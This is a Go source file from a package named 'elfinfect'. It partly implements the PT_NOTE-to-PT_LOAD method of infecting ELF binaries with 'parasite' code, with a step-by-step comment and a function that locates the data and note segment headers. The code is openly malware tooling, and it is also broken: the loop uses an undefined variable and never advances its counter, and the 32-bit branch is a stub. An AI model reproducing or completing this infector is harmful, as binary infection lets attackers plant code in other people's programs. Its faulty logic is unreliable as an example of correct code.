package elfinfect

import (
	"debug/elf"
	"errors"
	"fmt"
)

/*
	PT_NOTE -> PT_LOAD Steps
	1. Locate the data segment phdr:
		[a] - Find the address where the data segment ends.

		[b] - Find the file offset of the end of the data segment.

		[c] - Get the alignment size used for the loadable segment.

	2. Locate the PT_NOTE phdr:
		[a] - Convert phdr to PT_LOAD.

		[b] - Assign it starting address.
			dataSegEndAddr + dataAlignSize

		[c] Update newly created PT_NOTE file size and memory size to account for parasite.
*/

func (t *TargetBin) PtNoteToPtLoadInfection(debug bool, noRestoration bool, noRetOEP bool) error {
	//fmt.Println("Args")
	//fmt.Println("Args")
	//fmt.Printf("debug: %v\nnoRestoration: %v\nnoRetOEP: %v\n", debug, noRestoration, noRetOEP)
	//fmt.Println("Functionality is not implemented yet")
	//return nil

	var dataSegEndOff interface{}
	var dataSegEndAddr interface{}
	//var oShoff interface{}
	var dataNdx int
	var noteNdx int
	var dataAlignSize interface{}

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		pHeaders := t.Phdrs.([]elf.Prog64)
		pNum := int(t.Hdr.(*elf.Header64).Phnum)
		numPtNote := 0

		for pHeaderNdx := 0; pHeaderNdx < pNum; i++ {
			currentHeaderType := elf.ProgType(pHeaders[i].Type)
			currentHeaderFlags := elf.ProgFlag(pHeaders[i].Flags)
			if currentHeaderType == elf.PT_NOTE {
				numPtNote++
				noteNdx = pHeaderNdx
			}

			if numPtNote < 2 {
				if currentHeaderType == elf.PT_LOAD && currentHeaderFlags == (elf.PF_R|elf.PF_W) {
					dataNdx = pHeaderNdx
				}
			} else {
				return errors.New("Golang binaries are not supported for this algorithm")
			}
		}

		dataSegEndOff = pHeaders[dataNdx].Off
		dataAlignSize = pHeaders[dataNdx].Align

		if debug {
			fmt.Printf("[+] Data segment pHeader index @ %d\n", dataNdx)
			fmt.Printf("[+] Data segment file offset @  0x%x\n", dataSegEndOff)
			fmt.Printf("[+] Data segment alignment -> 0x%x\n", dataAlignSize)
			fmt.Printf("[+] PT_NOTE segment pHeader index @ %d\n", noteNdx)
		}

	case elf.ELFCLASS32:
		fmt.Println("Got 32bit intel elf binary this far")
	}
	return nil
}
